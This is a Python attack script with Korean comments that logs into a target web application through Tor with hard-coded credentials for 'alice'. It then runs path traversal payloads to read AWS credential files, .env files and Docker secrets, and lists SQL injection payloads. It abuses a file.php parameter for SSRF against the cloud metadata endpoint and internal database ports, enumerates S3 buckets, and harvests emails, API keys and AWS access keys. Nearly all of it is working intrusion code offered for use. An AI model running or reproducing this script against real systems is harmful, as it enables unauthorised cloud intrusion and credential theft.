#!/usr/bin/env python3
"""
내부 AWS 침투 - 리버스 쉘 없이
alice 계정 세션으로 내부 리소스 접근
"""

import requests
import json
import sys
import time

class AWSInternalPivot:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"

        self.session = requests.Session()
        self.session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }

        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def login_as_alice(self):
        """alice로 로그인"""
        print("[*] alice 계정으로 로그인 중...")

        data = {
            'username': 'alice',
            'password': 'alice2024'
        }

        try:
            resp = self.session.post(
                f"{self.base_url}/login.php",
                data=data,
                timeout=10,
                allow_redirects=True
            )

            if 'login.php' not in resp.url:
                print(f"[+] ✅ alice 로그인 성공!")
                print(f"[+] 세션 쿠키: {dict(self.session.cookies)}")
                return True
        except Exception as e:
            print(f"[-] 로그인 실패: {e}")

        return False

    def find_aws_config_files(self):
        """AWS 설정 파일 찾기 (Path Traversal)"""
        print("\n[*] AWS 설정 파일 검색 중...")

        aws_files = [
            # AWS CLI 설정
            "../../../home/ubuntu/.aws/credentials",
            "../../../home/ec2-user/.aws/credentials",
            "../../../root/.aws/credentials",
            "../../.aws/credentials",

            # 환경 설정
            "../../../etc/environment",
            "../../.env",
            "../.env",
            ".env",

            # 애플리케이션 설정
            "../config.php",
            "../../config.php",
            "../../../var/www/html/config.php",

            # Docker secrets
            "../../../run/secrets/aws_access_key_id",
            "../../../run/secrets/aws_secret_access_key",
        ]

        found_files = []

        for file_path in aws_files:
            try:
                url = f"{self.base_url}/file.php?name={file_path}"
                resp = self.session.get(url, timeout=5)

                if resp.status_code == 200 and len(resp.text) > 10:
                    # AWS 키 패턴 확인
                    if 'AKIA' in resp.text or 'aws_access_key' in resp.text or 'AWS_ACCESS_KEY' in resp.text:
                        print(f"\n[+] ✅ AWS 설정 발견: {file_path}")
                        print(f"    내용:\n{resp.text[:500]}")
                        found_files.append((file_path, resp.text))

            except:
                pass

        return found_files

    def check_database_for_secrets(self):
        """데이터베이스에서 AWS 자격증명 찾기"""
        print("\n[*] 데이터베이스에서 비밀 정보 검색 중...")

        # SQL Injection으로 데이터 추출 시도
        # Union-based (Prepared Statement 우회 시도)

        # 1. 에러 기반
        payloads = [
            "' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))) -- ",

            # 2. 시간 기반 (Blind)
            "' AND IF(1=1, SLEEP(0), 0) -- ",
        ]

        # 검색 기능이나 프로필 페이지에서 시도
        print("    [*] SQL Injection 시도 중...")

        # (실제 구현은 타겟 구조에 따라 다름)

        return None

    def enumerate_internal_services(self):
        """내부 서비스 열거 (SSRF 활용)"""
        print("\n[*] 내부 서비스 열거 중...")

        internal_services = [
            # AWS 서비스
            ("AWS Metadata", "http://169.254.169.254/latest/meta-data/"),

            # 내부 서비스
            ("MySQL", "http://127.0.0.1:3306"),
            ("Redis", "http://127.0.0.1:6379"),
            ("PostgreSQL", "http://127.0.0.1:5432"),
            ("MongoDB", "http://127.0.0.1:27017"),
            ("Elasticsearch", "http://127.0.0.1:9200"),

            # 관리 페널
            ("phpMyAdmin", "http://127.0.0.1/phpmyadmin"),
            ("Adminer", "http://127.0.0.1/adminer"),

            # 내부 API
            ("Internal API", "http://127.0.0.1:8080/api"),
            ("Admin API", "http://localhost/admin/api"),
        ]

        found_services = []

        for name, url in internal_services:
            try:
                # file.php를 SSRF 벡터로 사용
                ssrf_url = f"{self.base_url}/file.php?name={url}"
                resp = self.session.get(ssrf_url, timeout=3)

                if resp.status_code == 200 and len(resp.text) > 0:
                    print(f"[+] {name} 접근 가능: {url}")
                    print(f"    응답 길이: {len(resp.text)} bytes")
                    print(f"    응답 미리보기: {resp.text[:100]}")
                    found_services.append((name, url, resp.text))

            except:
                pass

        return found_services

    def check_s3_buckets(self):
        """공개 S3 버킷 확인"""
        print("\n[*] S3 버킷 열거 시도...")

        # 페이지 소스나 JS 파일에서 S3 URL 찾기
        try:
            resp = self.session.get(f"{self.base_url}/", timeout=10)

            import re
            s3_pattern = r'https?://([a-z0-9.-]+\.s3[a-z0-9.-]*\.amazonaws\.com|s3[a-z0-9.-]*\.amazonaws\.com/[a-z0-9.-]+)'

            buckets = re.findall(s3_pattern, resp.text)

            if buckets:
                print(f"[+] S3 버킷 발견: {len(buckets)}개")
                for bucket in set(buckets):
                    print(f"    - {bucket}")

                    # 공개 접근 테스트
                    try:
                        bucket_url = f"https://{bucket}"
                        test_resp = requests.get(bucket_url, timeout=5)
                        if test_resp.status_code == 200:
                            print(f"      [+] 공개 접근 가능!")
                    except:
                        pass

        except:
            pass

    def dump_user_data(self):
        """사용자 데이터 덤프"""
        print("\n[*] alice 계정 정보 수집 중...")

        # 프로필 페이지 접근
        try:
            resp = self.session.get(f"{self.base_url}/profile.php", timeout=10)
            print(f"[+] 프로필 페이지 접근 성공")
            print(f"    길이: {len(resp.text)} bytes")

            # 민감한 정보 패턴 검색
            import re

            # 이메일
            emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', resp.text)
            if emails:
                print(f"[+] 이메일 발견: {emails}")

            # API 키 패턴
            api_keys = re.findall(r'(?:api[_-]?key|apikey|api[_-]?secret)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]{20,})', resp.text, re.IGNORECASE)
            if api_keys:
                print(f"[+] API 키 발견: {api_keys}")

            # AWS 키
            aws_keys = re.findall(r'(AKIA[0-9A-Z]{16})', resp.text)
            if aws_keys:
                print(f"[+] ✅✅✅ AWS Access Key 발견: {aws_keys}")

        except Exception as e:
            print(f"[-] 프로필 접근 실패: {e}")

    def search_uploaded_files(self):
        """업로드된 파일에서 정보 수집"""
        print("\n[*] 업로드된 파일 검색 중...")

        # 다른 사용자의 업로드 파일 접근 시도
        common_files = [
            "config.txt",
            "backup.sql",
            "database.sql",
            "credentials.txt",
            "keys.txt",
            ".env",
            "aws.txt",
            "secrets.json",
        ]

        for filename in common_files:
            try:
                url = f"{self.base_url}/uploads/{filename}"
                resp = self.session.get(url, timeout=5)

                if resp.status_code == 200 and len(resp.text) > 10:
                    print(f"[+] 파일 발견: {filename}")
                    print(f"    내용:\n{resp.text[:300]}")

            except:
                pass

    def run(self):
        """전체 실행"""
        print("="*60)
        print("내부 AWS 침투 - 리버스 쉘 없이")
        print("alice 계정으로 내부 리소스 접근")
        print("="*60)

        # 1. 로그인
        if not self.login_as_alice():
            print("\n[-] 로그인 실패")
            return

        # 2. AWS 설정 파일 찾기
        aws_files = self.find_aws_config_files()

        # 3. 내부 서비스 열거
        services = self.enumerate_internal_services()

        # 4. S3 버킷 확인
        self.check_s3_buckets()

        # 5. 사용자 데이터 덤프
        self.dump_user_data()

        # 6. 업로드 파일 검색
        self.search_uploaded_files()

        print("\n" + "="*60)
        print("[+] 내부 침투 완료!")
        print("="*60)

def main():
    if len(sys.argv) < 2:
        print("사용법: python3 94_internal_aws_pivot.py <TARGET_IP>")
        print("예시: python3 94_internal_aws_pivot.py 43.201.154.142")
        sys.exit(1)

    target_ip = sys.argv[1]

    pivot = AWSInternalPivot(target_ip)
    pivot.run()

if __name__ == "__main__":
    main()
